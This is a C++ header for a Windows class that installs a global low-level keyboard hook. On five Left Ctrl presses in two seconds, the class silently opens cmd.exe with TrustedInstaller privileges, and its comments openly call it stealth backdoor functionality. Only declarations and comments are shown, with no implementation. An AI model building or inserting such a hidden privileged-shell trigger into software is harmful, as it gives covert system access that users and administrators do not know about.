/**
 * @file KeyboardHook.h
 * @brief Low-level keyboard hook for 5x Left Ctrl sequence detection
 * @author Marek Wesolowski
 * @date 2025
 * @copyright KVC Framework
 * 
 * Provides global keyboard hook for detecting specific key sequences
 * and triggering TrustedInstaller command prompt activation.
 * Used for stealth system access and backdoor functionality.
 */

#pragma once

#include "common.h"
#include <chrono>
#include <vector>

/**
 * @class KeyboardHook
 * @brief Low-level keyboard hook for 5x Left Ctrl sequence detection
 * 
 * Features:
 * - Global low-level keyboard hook installation
 * - 5x Left Ctrl sequence detection within 2 second window
 * - Key debouncing to prevent multiple triggers
 * - TrustedInstaller command prompt activation
 * - Stealth operation with no visible UI
 * 
 * Sequence: Press Left Ctrl key 5 times within 2 seconds
 * Action: Launches cmd.exe with TrustedInstaller privileges
 * 
 * @warning Security feature - authorized use only
 * @note Requires appropriate privileges for hook installation
 */
class KeyboardHook
{
public:
    /**
     * @brief Construct keyboard hook manager
     * 
     * Initializes internal state but does not install hook.
     * Call Install() to activate keyboard monitoring.
     */
    KeyboardHook();
    
    /**
     * @brief Destructor with automatic hook removal
     * 
     * Automatically uninstalls keyboard hook if still active.
     * Ensures clean resource cleanup.
     */
    ~KeyboardHook();

    // Disable copy semantics
    KeyboardHook(const KeyboardHook&) = delete;                    ///< Copy constructor deleted
    KeyboardHook& operator=(const KeyboardHook&) = delete;        ///< Copy assignment deleted

    // === Hook Management ===
    
    /**
     * @brief Install global keyboard hook
     * @return bool true if hook installed successfully
     * 
     * Installs low-level keyboard hook using SetWindowsHookExW.
     * The hook monitors all keyboard events system-wide.
     * 
     * @note Requires appropriate privileges for global hook
     * @note Hook callback runs in context of installing thread
     */
    bool Install() noexcept;
    
    /**
     * @brief Uninstall keyboard hook
     * 
     * Removes previously installed keyboard hook and
     * cleans up internal state. Safe to call if hook
     * is not installed.
     */
    void Uninstall() noexcept;
    
    /**
     * @brief Check if keyboard hook is installed
     * @return bool true if hook is currently active
     * 
     * Verifies that hook handle is valid and hook
     * is actively monitoring keyboard events.
     */
    bool IsInstalled() const noexcept { return m_hookHandle != nullptr; }

    // === Configuration Constants ===
    
    static constexpr int SEQUENCE_LENGTH = 5;           ///< Number of Left Ctrl presses required
    static constexpr DWORD SEQUENCE_TIMEOUT_MS = 2000;  ///< Time window for sequence completion
    static constexpr DWORD DEBOUNCE_MS = 50;            ///< Key debounce period to prevent duplicates

private:
    // === Hook Callback ===
    
    /**
     * @brief Low-level keyboard procedure (hook callback)
     * @param nCode Hook code indicating processing stage
     * @param wParam Event type (key down/up)
     * @param lParam Key event information structure
     * @return LRESULT Processing result
     * 
     * System-wide keyboard hook callback function. Processes
     * all keyboard events and detects Left Ctrl sequences.
     * 
     * @note Static callback required by Windows hook API
     * @note Must call CallNextHookEx for proper chain processing
     */
    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    
    // === Sequence Tracking ===
    
    /**
     * @struct KeyPress
     * @brief Individual key press tracking entry
     * 
     * Stores timestamp and event type for sequence analysis.
     */
    struct KeyPress {
        std::chrono::steady_clock::time_point timestamp;  ///< Precise event timestamp
        bool isPress;  ///< true for key down, false for key up
    };

    static HHOOK m_hookHandle;                          ///< Windows hook handle
    static std::vector<KeyPress> m_leftCtrlSequence;    ///< Left Ctrl press sequence buffer
    static std::chrono::steady_clock::time_point m_lastKeyTime;  ///< Last key event time

    // === Internal Logic ===
    
    /**
     * @brief Process Left Ctrl key event
     * @param isKeyDown true for key press, false for key release
     * 
     * Handles Left Ctrl key events and maintains sequence buffer.
     * Performs debouncing and timeout checks.
     * 
     * @note Core sequence detection logic
     */
    static void ProcessLeftCtrlEvent(bool isKeyDown) noexcept;
    
    /**
     * @brief Check if sequence is complete and valid
     * @return bool true if sequence conditions are met
     * 
     * Validates sequence against configuration:
     * - Exactly SEQUENCE_LENGTH presses
     * - Within SEQUENCE_TIMEOUT_MS window
     * - No duplicate events from debouncing
     * 
     * @note Sequence validation logic
     */
    static bool CheckSequenceComplete() noexcept;
    
    /**
     * @brief Clear old entries from sequence buffer
     * 
     * Removes expired key presses from sequence buffer
     * based on SEQUENCE_TIMEOUT_MS configuration.
     * 
     * @note Maintains sequence buffer integrity
     */
    static void ClearOldEntries() noexcept;
    
    /**
     * @brief Trigger TrustedInstaller command prompt
     * 
     * Executes action when sequence is detected:
     * - Launches cmd.exe with TrustedInstaller privileges
     * - Uses stealth execution methods
     * - No visible window activation
     * 
     * @note Core backdoor activation method
     */
    static void TriggerTrustedInstallerCmd() noexcept;
    
    /**
     * @brief Launch command prompt with TrustedInstaller privileges
     * @return bool true if command prompt launched successfully
     * 
     * Uses TrustedInstaller integration to launch cmd.exe
     * with maximum privileges for system access.
     * 
     * @note Requires TrustedInstaller token acquisition
     */
    static bool LaunchCmdWithTrustedInstaller() noexcept;
    
    // === Debugging and Logging ===
    
    /**
     * @brief Log current sequence state for debugging
     * 
     * Outputs sequence buffer contents and timing information
     * for debugging and development purposes.
     * 
     * @note Only active in debug builds
     */
    static void LogSequenceState() noexcept;
};